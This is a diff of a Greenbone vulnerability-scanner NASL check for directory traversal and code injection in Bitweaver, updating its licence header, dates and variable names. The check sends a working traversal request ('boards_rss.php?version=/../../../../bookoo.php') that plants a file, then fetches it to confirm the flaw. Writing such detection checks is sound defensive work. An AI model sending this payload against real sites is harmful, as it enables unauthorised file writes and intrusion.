@@ -1,30 +1,16 @@
-# Copyright (C) 2009 Greenbone Networks GmbH
+# SPDX-FileCopyrightText: 2009 Greenbone AG
 # Some text descriptions might be excerpted from (a) referenced
 # source(s), and are Copyright (C) by the respective right holder(s).
 #
-# SPDX-License-Identifier: GPL-2.0-or-later
-#
-# This program is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation; either version 2
-# of the License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+# SPDX-License-Identifier: GPL-2.0-only
 
 CPE = "cpe:/a:bitweaver:bitweaver";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.900356");
-  script_version("2022-05-09T13:48:18+0000");
-  script_tag(name:"last_modification", value:"2022-05-09 13:48:18 +0000 (Mon, 09 May 2022)");
+  script_version("2023-06-22T10:34:14+0000");
+  script_tag(name:"last_modification", value:"2023-06-22 10:34:14 +0000 (Thu, 22 Jun 2023)");
   script_tag(name:"creation_date", value:"2009-05-26 15:05:11 +0200 (Tue, 26 May 2009)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -32,7 +18,7 @@ if(description)
   script_name("Bitweaver Directory Traversal And Code Injection Vulnerabilities");
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
+  script_copyright("Copyright (C) 2009 Greenbone AG");
   script_family("Web application abuses");
   script_dependencies("secpod_bitweaver_detect.nasl");
   script_require_ports("Services/www", 80);
@@ -66,25 +52,30 @@ if(description)
 include("http_func.inc");
 include("host_details.inc");
 
-if(!bitweaverPort = get_app_port(cpe:CPE))exit(0);
-if(!dir = get_app_location(cpe:CPE, port:bitweaverPort))exit(0);
+if(!port = get_app_port(cpe:CPE))
+  exit(0);
+
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
+
+if(dir == "/")
+  dir = "";
 
 # if short_open_tag in php.ini is off (because of "<?xml ..." preamble
 # generating a parse error with short_open_tag = on), you can now launch
 # commands:
 
-pocReq = http_get(item:string(dir + "/boards/boards_rss.php?version=/../../../../bookoo.php \r\n\r\n"), port:bitweaverPort);
-rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);
+req = http_get(item:string(dir + "/boards/boards_rss.php?version=/../../../../bookoo.php \r\n\r\n"), port:port);
+res = http_send_recv(port:port, data:req);
 
-if("Set-Cookie: BWSESSION" >< rcvRes &&
-   egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
+if("Set-Cookie: BWSESSION" >< res &&
+   egrep(pattern:"^HTTP/1\.[01] 200", string:res, icase:TRUE))
 {
-  pocReq = http_get(item:string(dir + "/bookoo.php.xml \r\n\r\n"), port:bitweaverPort);
-  rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);
+  req = http_get(item:string(dir + "/bookoo.php.xml \r\n\r\n"), port:port);
+  res = http_send_recv(port:port, data:req);
 
-  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) && "<title> Feed</title>" >< rcvRes)
-  {
-    security_message(bitweaverPort);
+  if(egrep(pattern:"^HTTP/1\.[01] 200", string:res, icase:TRUE) && "<title> Feed</title>" >< res) {
+    security_message(port:port);
     exit(0);
   }
 }
